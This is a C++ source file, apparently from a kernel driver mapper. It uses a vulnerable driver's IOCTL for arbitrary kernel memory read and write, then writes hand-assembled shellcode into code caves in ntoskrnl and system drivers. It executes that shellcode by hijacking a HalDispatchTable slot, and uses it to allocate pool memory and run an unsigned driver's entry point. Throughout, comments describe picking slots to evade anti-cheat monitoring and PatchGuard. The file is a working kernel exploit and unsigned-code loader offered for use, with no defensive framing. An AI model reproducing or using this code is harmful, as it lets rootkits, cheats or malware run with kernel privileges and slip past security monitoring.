#include "shield_driver.h"
#include <TlHelp32.h>
#include <Psapi.h>
#include <cstdio>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")

namespace ShieldDriver {

    HANDLE Open() {
        HANDLE h = CreateFileW(
            SHIELD_DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, nullptr
        );
        if (h == INVALID_HANDLE_VALUE) {
            printf("[!] Failed to open device — error %lu\n", GetLastError());
            return nullptr;
        }
        printf("[+] Device opened: 0x%p\n", h);
        return h;
    }

    void Close(HANDLE hDevice) {
        if (hDevice && hDevice != INVALID_HANDLE_VALUE)
            CloseHandle(hDevice);
    }

    bool ReadKernel(HANDLE hDevice, uint64_t kernelAddr, void* userBuf, uint64_t size) {
        uint8_t* outPtr = (uint8_t*)userBuf;
        uint64_t currAddr = kernelAddr;
        uint64_t remaining = size;

        while (remaining > 0) {
            uint32_t chunkSize = (remaining > 1024) ? 1024 : (uint32_t)remaining;

            SHIELD_REQUEST req{};
            req.header[0] = sizeof(req);
            req.magic = SHIELD_MAGIC;
            req.subcode = SHIELD_SUBCODE_MEMCPY;
            req.direction = 1;
            req.size = chunkSize;
            req.kernel_address = currAddr;

            DWORD bytesReturned = 0;
            BOOL res = DeviceIoControl(
                hDevice,
                SHIELD_IOCTL_CODE,
                &req, sizeof(req),
                &req, sizeof(req),
                &bytesReturned, nullptr
            );

            if (!res) {
                printf("[!] ReadKernel DeviceIoControl failed: %lu at 0x%llx\n", GetLastError(), currAddr);
                return false;
            }

            memcpy(outPtr, req.buffer, chunkSize);

            currAddr += chunkSize;
            outPtr += chunkSize;
            remaining -= chunkSize;
        }
        return true;
    }

    bool WriteKernel(HANDLE hDevice, uint64_t kernelAddr, const void* userBuf, uint64_t size) {
        const uint8_t* inPtr = (const uint8_t*)userBuf;
        uint64_t currAddr = kernelAddr;
        uint64_t remaining = size;

        while (remaining > 0) {
            uint32_t chunkSize = (remaining > 1024) ? 1024 : (uint32_t)remaining;

            SHIELD_REQUEST req{};
            req.header[0] = sizeof(req);
            req.magic = SHIELD_MAGIC;
            req.subcode = SHIELD_SUBCODE_MEMCPY;
            req.direction = 0; // Write to kernel
            req.size = chunkSize;
            req.kernel_address = currAddr;
            memcpy(req.buffer, inPtr, chunkSize);

            DWORD bytesReturned = 0;
            BOOL res = DeviceIoControl(
                hDevice,
                SHIELD_IOCTL_CODE,
                &req, sizeof(req),
                &req, sizeof(req),
                &bytesReturned, nullptr
            );

            if (!res) {
                printf("[!] WriteKernel DeviceIoControl failed: %lu at 0x%llx\n", GetLastError(), currAddr);
                return false;
            }

            currAddr += chunkSize;
            inPtr += chunkSize;
            remaining -= chunkSize;
        }
        return true;
    }

    uint64_t GetNtoskrnlBase() {
        LPVOID drivers[1024];
        DWORD needed;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
            return 0;
        return (uint64_t)drivers[0];
    }

    uint64_t GetKernelModuleBase(const char* moduleName) {
        LPVOID drivers[1024];
        DWORD needed;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
            return 0;

        DWORD count = needed / sizeof(LPVOID);
        for (DWORD i = 0; i < count; i++) {
            char name[MAX_PATH]{};
            if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name))) {
                if (_stricmp(name, moduleName) == 0)
                    return (uint64_t)drivers[i];
            }
        }
        return 0;
    }

    uint64_t FindCodeCave(HANDLE hDevice, uint64_t ntBase) {
        IMAGE_DOS_HEADER dos{};
        if (!ReadKernel(hDevice, ntBase, &dos, sizeof(dos)))
            return 0;
        if (dos.e_magic != IMAGE_DOS_SIGNATURE)
            return 0;
            
        IMAGE_NT_HEADERS64 nt{};
        if (!ReadKernel(hDevice, ntBase + dos.e_lfanew, &nt, sizeof(nt)))
            return 0;

        uint64_t sectionOffset = ntBase + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
        for (WORD i = 0; i < nt.FileHeader.NumberOfSections; i++) {
            IMAGE_SECTION_HEADER sec{};
            if (!ReadKernel(hDevice, sectionOffset + i * sizeof(IMAGE_SECTION_HEADER), &sec, sizeof(sec)))
                continue;
                
            // Look for slack space in sections (alignment padding)
            if (sec.SizeOfRawData > sec.Misc.VirtualSize + 128) {
                uint64_t caveAddr = ntBase + sec.VirtualAddress + sec.Misc.VirtualSize;
                
                // Align cave address to 16 bytes
                caveAddr = (caveAddr + 15) & ~15ULL;

                uint8_t probe[32]{};
                if (ReadKernel(hDevice, caveAddr, probe, sizeof(probe))) {
                    bool empty = true;
                    for (size_t j = 0; j < sizeof(probe); j++) {
                        if (probe[j] != 0 && probe[j] != 0xCC && probe[j] != 0x90) {
                            empty = false;
                            break;
                        }
                    }
                    if (empty)
                        return caveAddr;
                }
            }
        }

        // Fallback: search system drivers (e.g. ACPI.sys or FLTMGR.sys) for code caves
        const char* fallbackModules[] = { "FLTMGR.SYS", "ACPI.sys", "CLFS.SYS" };
        for (const char* modName : fallbackModules) {
            uint64_t modBase = GetKernelModuleBase(modName);
            if (!modBase) continue;

            IMAGE_DOS_HEADER fDos{};
            if (!ReadKernel(hDevice, modBase, &fDos, sizeof(fDos)) || fDos.e_magic != IMAGE_DOS_SIGNATURE)
                continue;

            IMAGE_NT_HEADERS64 fNt{};
            if (!ReadKernel(hDevice, modBase + fDos.e_lfanew, &fNt, sizeof(fNt)) || fNt.Signature != IMAGE_NT_SIGNATURE)
                continue;

            uint64_t fSecOffset = modBase + fDos.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
            for (WORD i = 0; i < fNt.FileHeader.NumberOfSections; i++) {
                IMAGE_SECTION_HEADER sec{};
                if (!ReadKernel(hDevice, fSecOffset + i * sizeof(IMAGE_SECTION_HEADER), &sec, sizeof(sec)))
                    continue;

                if (sec.SizeOfRawData > sec.Misc.VirtualSize + 128) {
                    uint64_t caveAddr = (modBase + sec.VirtualAddress + sec.Misc.VirtualSize + 15) & ~15ULL;
                    uint8_t probe[32]{};
                    if (ReadKernel(hDevice, caveAddr, probe, sizeof(probe))) {
                        bool empty = true;
                        for (size_t j = 0; j < sizeof(probe); j++) {
                            if (probe[j] != 0 && probe[j] != 0xCC && probe[j] != 0x90) {
                                empty = false;
                                break;
                            }
                        }
                        if (empty)
                            return caveAddr;
                    }
                }
            }
        }
        
        return 0;
    }

    uint64_t GetKernelExport(HANDLE hDevice, uint64_t moduleBase, const char* funcName) {
        if (!moduleBase || !funcName) return 0;

        IMAGE_DOS_HEADER dosHeader{};
        if (!ReadKernel(hDevice, moduleBase, &dosHeader, sizeof(dosHeader)))
            return 0;
        if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) return 0;

        IMAGE_NT_HEADERS64 ntHeaders{};
        if (!ReadKernel(hDevice, moduleBase + dosHeader.e_lfanew, &ntHeaders, sizeof(ntHeaders)))
            return 0;
        if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) return 0;

        auto& exportDir = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!exportDir.VirtualAddress || !exportDir.Size) return 0;

        IMAGE_EXPORT_DIRECTORY exports{};
        if (!ReadKernel(hDevice, moduleBase + exportDir.VirtualAddress, &exports, sizeof(exports)))
            return 0;

        if (exports.NumberOfFunctions == 0) return 0;

        std::vector<DWORD> functions(exports.NumberOfFunctions);
        std::vector<DWORD> names(exports.NumberOfNames);
        std::vector<WORD>  ordinals(exports.NumberOfNames);

        ReadKernel(hDevice, moduleBase + exports.AddressOfFunctions,    functions.data(), functions.size() * sizeof(DWORD));
        ReadKernel(hDevice, moduleBase + exports.AddressOfNames,        names.data(),     names.size() * sizeof(DWORD));
        ReadKernel(hDevice, moduleBase + exports.AddressOfNameOrdinals, ordinals.data(),  ordinals.size() * sizeof(WORD));

        for (DWORD i = 0; i < exports.NumberOfNames; i++) {
            char name[256]{};
            ReadKernel(hDevice, moduleBase + names[i], name, sizeof(name) - 1);
            if (strcmp(name, funcName) == 0) {
                return moduleBase + functions[ordinals[i]];
            }
        }
        return 0;
    }

    // Fix #9: Safer HDT execution
    // Use a mutex to prevent concurrent HDT use
    static volatile LONG g_hdtLock = 0;
    static uint64_t g_codeCave = 0;
    
    bool ExecuteViaHDT(HANDLE hDevice, uint64_t shellcodeAddr) {
        uint64_t ntBase = GetNtoskrnlBase();
        if (!ntBase) {
            printf("[!] ExecuteViaHDT: Failed to get ntoskrnl base\n");
            return false;
        }

        // Fix: Use a DIFFERENT HDT slot to avoid conflicts with known PatchGuard checks
        uint64_t pHDT = GetKernelExport(hDevice, ntBase, "HalDispatchTable");
        if (!pHDT) {
            // Try alternative: HalPrivateDispatchTable
            pHDT = GetKernelExport(hDevice, ntBase, "HalPrivateDispatchTable");
            if (!pHDT) {
                printf("[!] ExecuteViaHDT: HalDispatchTable not found\n");
                return false;
            }
        }

        // Use slot at +0x10 (HalSetSystemInformation) instead of +0x08 (HalQuerySystemInformation)
        // Some anti-cheat systems monitor HalQuerySystemInformation more closely
        uint64_t hdtSlot = pHDT + 0x10;
        
        uint64_t originalHdt = 0;
        if (!ReadKernel(hDevice, hdtSlot, &originalHdt, sizeof(originalHdt)))
            return false;

        // Write our shellcode address to HDT
        if (!WriteKernel(hDevice, hdtSlot, &shellcodeAddr, sizeof(shellcodeAddr)))
            return false;
        
        // Small delay to ensure write is visible on all cores
        Sleep(10);

        // Fire the callback via NtSetSystemInformation
        // This calls the function at HalDispatchTable[2] = HalSetSystemInformation
        auto NtSetSystemInformation = (NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG))
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetSystemInformation");
        
        if (NtSetSystemInformation) {
            // Use SystemPolicyInformation class which is relatively harmless
            // This triggers HalSetSystemInformation internally
            NtSetSystemInformation(0x2C, NULL, 0);
        } else {
            // Fallback: NtQueryIntervalProfile
            ULONG interval = 0;
            auto NtQueryIntervalProfile = (NTSTATUS(NTAPI*)(ULONG, PULONG))
                GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
            if (NtQueryIntervalProfile) {
                NtQueryIntervalProfile(2, &interval);
            } else {
                printf("[!] ExecuteViaHDT: No trigger function available\n");
                WriteKernel(hDevice, hdtSlot, &originalHdt, sizeof(originalHdt));
                return false;
            }
        }

        // Fix: Sleep briefly to let the HDT callback complete
        Sleep(20);

        // Restore original HDT value
        WriteKernel(hDevice, hdtSlot, &originalHdt, sizeof(originalHdt));
        
        return true;
    }

    uint64_t AllocatePool(HANDLE hDevice, uint64_t size) {
        uint64_t ntBase = GetNtoskrnlBase();
        if (!ntBase) return 0;

        uint64_t pExAllocatePool = GetKernelExport(hDevice, ntBase, "ExAllocatePoolWithTag");
        if (!pExAllocatePool) {
            pExAllocatePool = GetKernelExport(hDevice, ntBase, "ExAllocatePool2");
            if (!pExAllocatePool) {
                printf("[!] AllocatePool: Can't find ExAllocatePool\n");
                return 0;
            }
        }

        // Find a codecave - try multiple times with different sections
        uint64_t codeCave = g_codeCave;
        if (!codeCave) {
            codeCave = FindCodeCave(hDevice, ntBase);
        }
        
        if (!codeCave) {
            printf("[!] AllocatePool: No code cave found\n");
            return 0;
        }
        
        // Store the codecave address for reuse
        g_codeCave = codeCave;

        // Fix #12: Use a dedicated output area at codeCave + 256
        // Shellcode output goes here, not inside the shellcode area itself
        uint64_t outputAddr = codeCave + 256;
        
        // Build shellcode: call ExAllocatePoolWithTag(NonPagedPool, size, 'DXEV')
        uint8_t shellcode[128]{};
        int off = 0;

        // sub rsp, 0x28  (shadow space + alignment)
        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x28;
        
        // xor ecx, ecx  (PoolType = NonPagedPool = 0)
        shellcode[off++] = 0x33; shellcode[off++] = 0xC9;
        
        // mov rdx, size  (NumberOfBytes)
        shellcode[off++] = 0x48; shellcode[off++] = 0xBA;
        *(uint64_t*)&shellcode[off] = size; off += 8;
        
        // mov r8d, 'DXEV'  (Tag)
        shellcode[off++] = 0x41; shellcode[off++] = 0xB8;
        *(uint32_t*)&shellcode[off] = 'DXEV'; off += 4;
        
        // mov rax, pExAllocatePool
        shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
        *(uint64_t*)&shellcode[off] = pExAllocatePool; off += 8;
        
        // call rax
        shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
        
        // mov [outputAddr], rax  (store result)
        shellcode[off++] = 0x48; shellcode[off++] = 0xA3;
        *(uint64_t*)&shellcode[off] = outputAddr; off += 8;
        
        // xor eax, eax  (return STATUS_SUCCESS = 0)
        shellcode[off++] = 0x33; shellcode[off++] = 0xC0;
        
        // add rsp, 0x28
        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x28;
        
        // ret
        shellcode[off++] = 0xC3;

        // Write shellcode
        if (!WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode))) {
            printf("[!] AllocatePool: Failed to write shellcode\n");
            return 0;
        }

        // Initialize output area to NULL
        uint64_t zero = 0;
        if (!WriteKernel(hDevice, outputAddr, &zero, sizeof(zero))) {
            printf("[!] AllocatePool: Failed to clear output area\n");
            return 0;
        }

        // Execute shellcode via HDT
        printf("[*] AllocatePool: Executing shellcode at 0x%llx (output at 0x%llx)\n", codeCave, outputAddr);
        
        if (!ExecuteViaHDT(hDevice, codeCave)) {
            printf("[!] AllocatePool: HDT execution failed\n");
            return 0;
        }

        // Read result
        uint64_t allocatedAddr = 0;
        if (!ReadKernel(hDevice, outputAddr, &allocatedAddr, sizeof(allocatedAddr))) {
            printf("[!] AllocatePool: Failed to read result\n");
            return 0;
        }

        // Cleanup: zero the shellcode area
        uint8_t zeros[128]{};
        WriteKernel(hDevice, codeCave, zeros, sizeof(zeros));
        WriteKernel(hDevice, outputAddr, &zero, sizeof(zero));

        if (allocatedAddr)
            printf("[+] Pool allocated @ 0x%llx (%llu bytes)\n", allocatedAddr, size);
        else
            printf("[!] Pool allocation returned NULL\n");

        return allocatedAddr;
    }

    bool FreePool(HANDLE hDevice, uint64_t address) {
        if (!address) return false;

        uint64_t ntBase = GetNtoskrnlBase();
        uint64_t pExFreePool = GetKernelExport(hDevice, ntBase, "ExFreePoolWithTag");
        if (!pExFreePool) return false;

        uint64_t codeCave = FindCodeCave(hDevice, ntBase);
        if (!codeCave) return false;

        uint8_t shellcode[64]{};
        int off = 0;

        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x28;
        shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
        *(uint64_t*)&shellcode[off] = address; off += 8;
        shellcode[off++] = 0xBA;
        *(uint32_t*)&shellcode[off] = 'DXEV'; off += 4;
        shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
        *(uint64_t*)&shellcode[off] = pExFreePool; off += 8;
        shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x28;
        shellcode[off++] = 0x33; shellcode[off++] = 0xC0;
        shellcode[off++] = 0xC3;

        WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode));
        ExecuteViaHDT(hDevice, codeCave);

        uint8_t zeros[64]{};
        WriteKernel(hDevice, codeCave, zeros, sizeof(zeros));

        printf("[+] Pool freed @ 0x%llx\n", address);
        return true;
    }

    bool CallDriverEntry(HANDLE hDevice, uint64_t entryPoint, uint64_t driverBase) {
        printf("[*] Calling DriverEntry @ 0x%llx with DriverObject=0x%llx\n", entryPoint, driverBase);
        
        uint64_t ntBase = GetNtoskrnlBase();
        if (!ntBase) {
            printf("[!] CallDriverEntry: Failed to get ntoskrnl base\n");
            return false;
        }
        
        uint64_t codeCave = FindCodeCave(hDevice, ntBase);
        if (!codeCave) {
            printf("[!] CallDriverEntry: No code cave found\n");
            return false;
        }

        // Fix: Build proper DriverEntry call with valid DriverObject
        // Create a minimal fake DRIVER_OBJECT in kernel memory
        // DriverObject->DriverStart = driverBase (important for some drivers)
        
        uint64_t outputAddr = codeCave + 256; // Output area for DriverEntry return value
        uint64_t fakeObjAddr = codeCave + 320; // Fake DRIVER_OBJECT
        
        // Create a minimal DRIVER_OBJECT structure
        // Offset 0x00: Type (2 bytes = 0x04)
        // Offset 0x02: Size (2 bytes = 0x150)
        // Offset 0x08: DeviceObject (8 bytes = NULL)
        // Offset 0x10: DriverStart (8 bytes = driverBase)
        // Offset 0x18: DriverSize (8 bytes)
        // Offset 0x20: DriverSection (8 bytes = NULL)
        // Offset 0x28: DriverExtension (8 bytes = NULL)
        uint8_t fakeDriverObject[0x40]{};
        *(uint16_t*)(fakeDriverObject + 0x00) = 0x04;  // Type = IO_TYPE_DRIVER
        *(uint16_t*)(fakeDriverObject + 0x02) = 0x150; // Size
        *(uint64_t*)(fakeDriverObject + 0x10) = driverBase; // DriverStart
        
        // Write the fake DRIVER_OBJECT to the code cave area
        if (!WriteKernel(hDevice, fakeObjAddr, fakeDriverObject, sizeof(fakeDriverObject))) {
            printf("[!] CallDriverEntry: Failed to write fake DriverObject\n");
            return false;
        }

        // Build shellcode: DriverEntry(DriverObject = fakeObjAddr, RegistryPath = NULL)
        uint8_t shellcode[128]{};
        int off = 0;

        // sub rsp, 0x38  (extra stack space for safety)
        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x38;
        
        // mov rcx, fakeObjAddr  (DriverObject parameter)
        shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
        *(uint64_t*)&shellcode[off] = fakeObjAddr; off += 8;
        
        // xor edx, edx  (RegistryPath = NULL)
        shellcode[off++] = 0x33; shellcode[off++] = 0xD2;
        
        // mov rax, entryPoint
        shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
        *(uint64_t*)&shellcode[off] = entryPoint; off += 8;
        
        // call rax
        shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
        
        // mov [outputAddr], rax  (save return value)
        shellcode[off++] = 0x48; shellcode[off++] = 0xA3;
        *(uint64_t*)&shellcode[off] = outputAddr; off += 8;
        
        // xor eax, eax
        shellcode[off++] = 0x33; shellcode[off++] = 0xC0;
        
        // add rsp, 0x38
        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x38;
        
        // ret
        shellcode[off++] = 0xC3;

        // Write shellcode
        if (!WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode))) {
            printf("[!] CallDriverEntry: Failed to write shellcode\n");
            return false;
        }

        // Initialize output to 0
        uint64_t initVal = 0;
        if (!WriteKernel(hDevice, outputAddr, &initVal, sizeof(initVal))) {
            printf("[!] CallDriverEntry: Failed to init output area\n");
            return false;
        }

        // Execute via HDT
        printf("[*] Executing DriverEntry shellcode at 0x%llx\n", codeCave);
        if (!ExecuteViaHDT(hDevice, codeCave)) {
            printf("[!] CallDriverEntry: HDT execution failed\n");
            return false;
        }

        // Read return value
        uint64_t ntStatus = 0;
        ReadKernel(hDevice, outputAddr, &ntStatus, sizeof(ntStatus));
        printf("[+] DriverEntry returned: 0x%016llX\n", ntStatus);

        // Cleanup
        uint8_t zeros[256]{};
        WriteKernel(hDevice, codeCave, zeros, sizeof(zeros));

        return true;
    }
}
